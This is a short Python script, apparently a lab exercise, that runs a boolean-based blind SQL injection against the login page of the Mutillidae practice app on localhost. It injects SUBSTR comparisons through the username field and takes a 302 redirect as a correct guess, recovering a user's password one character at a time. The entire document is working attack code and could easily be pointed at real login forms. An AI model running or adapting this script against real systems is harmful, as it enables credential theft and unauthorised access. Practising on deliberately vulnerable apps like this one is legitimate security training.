import requests
import sys
import string

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def to_post(password_char, password_position):
    query = "user7778\' AND SUBSTR(password,%d,1)=\'%s\'-- " % (password_position, password_char)

    target = "http://127.0.0.1/mutillidae/index.php?page=login.php"
    data = {'username': query, 'password': '', 'login-php-submit-button': 'Login'}

    r = requests.post(url=target, data=data, proxies=proxies, allow_redirects=False)
    if r.status_code == 302:
        # print("you Guessed correct password character!")
        return True
    else:
        # print("Try another character")
        return False


if __name__ == "__main__":
    a_A_list = list(string.ascii_letters)
    for x in range(10):
        a_A_list.append(x)

    password_result = []
    for position in range(1, 21):
        for ch in a_A_list:
            result = to_post(ch, position)
            if result:
                password_result.append(str(ch))
                break
            else:
                continue

    password_result = ''.join(password_result)
    print('password is %s' % password_result)
